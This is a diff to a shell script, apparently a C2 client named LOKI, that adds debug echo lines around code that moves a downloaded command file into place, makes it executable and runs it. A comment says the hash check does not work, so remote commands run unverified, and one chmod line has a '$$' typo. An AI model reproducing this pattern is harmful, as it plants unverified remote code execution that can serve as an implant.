@@ -22,6 +22,7 @@ if [ -f "$LOKIHOME/$MYNAME" ]; then
 		
 		# Hashing isn't working, let's go through the rest of the functionality and come back to it.
 		$MV $LOKIHOME/$MYNAME $LOKIHOME/$MYNAME-command.txt
+		$ECHO "Moved $MV $LOKIHOME/$MYNAME $LOKIHOME/$MYNAME-command.txt"
 		
 else
     $ECHO "No $LOKIHOME/$MYNAME-command.txt found"
@@ -31,15 +32,24 @@ fi
 if [ -f "$LOKIHOME/$MYNAME-command.txt" ]; then
 	$LOG "Command File Downloaded, Checking Version"
 	
+	$ECHO "Downloaded $LOKIHOME/$MYNAME-command.txt,"
+	
 	# If we downloaded a file, check to see if there is a current command file
 	if [ -f "$LOKIHOME/$MYNAME-current.sh" ]; then
 	# If there is a current command file, compare the two
+		$ECHO "THere was already a $LOKIHOME/$MYNAME-current.sh, so we're checking to see if the newly downloaded one is the same"
 	    $DIFF $LOKIHOME/$MYNAME-command.txt $LOKIHOME/$MYNAME-current.sh
 		if [ $? == 1 ]; then
 		$LOG "This is a new command file"
+		
+		$ECHO "This is a new command file"
+		
 		# If they are different, check the hash of the first one (from the C2) and, if it's legit,
 		#      overwrite the current file with the new file and run it
 		$MV $LOKIHOME/$MYNAME-command.txt $LOKIHOME/$MYNAME-current.sh
+		
+		$ECHO "Moving $CHMOD +x $$LOKIHOME/$MYNAME-current.sh"
+		
 		$CHMOD +x $$LOKIHOME/$MYNAME-current.sh
 		$LOKIHOME/$MYNAME-current.sh
 		else
@@ -48,7 +58,11 @@ if [ -f "$LOKIHOME/$MYNAME-command.txt" ]; then
 		fi
 	else
 		$LOG "No previous command file.  Moving this one to command and running"
+				
 		$MV $LOKIHOME/$MYNAME-command.txt $LOKIHOME/$MYNAME-current.sh
+		
+		$ECHO "No previous command files are here, $MV $LOKIHOME/$MYNAME-command.txt $LOKIHOME/$MYNAME-current.sh"
+		
 		$CHMOD +x $LOKIHOME/$MYNAME-current.sh
 		$LOKIHOME/$MYNAME-current.sh
 	fi 
